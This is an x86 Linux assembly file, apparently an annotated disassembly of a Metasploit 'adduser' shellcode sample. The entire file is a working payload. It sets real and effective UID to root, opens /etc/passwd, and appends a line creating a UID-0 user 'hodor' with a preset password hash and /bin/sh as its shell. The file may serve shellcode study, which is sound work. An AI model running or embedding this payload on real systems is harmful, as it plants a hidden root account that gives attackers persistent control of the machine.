; Name; msf_linx86_adduser_asm_sample1-alt.asm
; Author hodorsec

global _start
section .text

_start:
	
; setreuid
xor ecx,ecx		; Clear registers -> ECX 0 for effective UID root
mov ebx,ecx		; Clear registers -> EBX 0 for real UID root
push byte +0x46		; For function call sys_setreuid16
pop eax			; Place in EAX
int 0x80		; Syscall

; sys_open
push byte +0x5		; Put 5 on stack, syscall sys_open
pop eax			; Put the value in EAX for syscall sys_open
xor ecx,ecx		; Clear count register
push ecx		; NULL terminate strings
push dword 0x64777373	; 'sswd'
push dword 0x61702f2f	; '//pa'
push dword 0x6374652f	; '/etc'
mov ebx,esp		; Put string in EBX as flags argument for sys_open, as filepointer
inc ecx			; Increment ECX
mov ch,0x4		; Mode parameter for sys_open in CX 0x0401 for flags tot sys_open call
int 0x80		; Syscall

; sys_write
xchg eax,ebx		; Put result of last function as argument in EAX
call dword 0x4e		; Call 'pop ecx' for putting the string for "write" in ECX to be put in /etc/passwd

; BEGIN STRING
; $ echo -ne "\x68\x6f\x64\x6f\x72\x3a\x41\x7a\x6d\x75\x5a\x72\x6f\x73\x42\x6a\x52\x59\x55\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a"
; $ hodor:AzmuZrosBjRYU:0:0::/:/bin/sh
push dword 0x726f646f	; 'odor'; ending of the string
cmp al,[ecx+0x7a]
insd
jnz 0x90
jc 0xa7
jnc 0x7c
push byte +0x52
pop ecx
push ebp
cmp dh,[eax]
cmp dh,[eax]
cmp bh,[edx]
das
cmp ch,[edi]
bound ebp,[ecx+0x6e]
das
jnc 0xb5
; END STRING

; sys_write continue
or bl,[ecx-0x75]	; linefeed, pop ecx, db 0x8b
push ecx		; Push the value of ECX on stack
cld			; Clear direction flag
push byte +0x4		; For function call sys_write, define __NR_write 4
pop eax			; Put value in EAX
int 0x80		; Syscall

; sys_exit
push byte +0x1		; Syscall code for exit
pop eax			; Put value in EAX
int 0x80		; Syscall

